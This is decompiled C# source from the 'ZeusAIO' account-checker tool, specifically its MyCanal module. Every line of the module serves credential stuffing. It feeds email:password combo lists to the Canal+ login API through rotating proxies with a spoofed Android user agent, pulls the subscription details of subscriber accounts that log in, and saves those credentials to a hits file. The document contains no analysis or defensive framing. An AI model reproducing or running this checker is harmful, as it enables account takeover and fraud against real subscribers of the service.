// Decompiled with JetBrains decompiler
// Type: MyCanal.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace MyCanal
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              string str1 = "vect=INTERNET&media=IOS%20PHONE&portailId=OQaRQJQkSdM.&distributorId=C22021&analytics=false&trackingPub=false&email=" + s[0] + "&password=" + s[1];
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string source1 = httpRequest.Post("https://pass-api-v2.canal-plus.com/services/apipublique/login", str1, "application/x-www-form-urlencoded").ToString();
              if (source1.Contains("\"isSubscriber\":true,"))
              {
                string str2 = Check.Parse(source1, "passToken\":\"", "\",\"userData");
                httpRequest.AddHeader("Cookie", "s_token=" + str2);
                string source2 = httpRequest.Get("https://api-client.canal-plus.com/self/persons/current/subscriptions").ToString();
                string str3 = Check.Parse(source2, "startDate\":\"", "\",\"endDate ");
                string str4 = Check.Parse(source2, "endDate\":\"", "\",\"products");
                string str5 = Check.Parse(source2, "commercialLabel\":\"", "\"");
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - MYCANAL] " + s[0] + ":" + s[1] + " | StartDate: " + str3 + " | EndDate: " + str4 + " | Sub: " + str5, Color.Green);
                Export.AsResult("/Mycanal_hits", s[0] + ":" + s[1] + " | StartDate: " + str3 + " | EndDate: " + str4 + " | Sub: " + str5);
                return false;
              }
              if (source1.Contains("Login ou mot de passe invalide") || source1.Contains("Compte bloque") || source1.Contains("\"isSubscriber\":false,"))
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
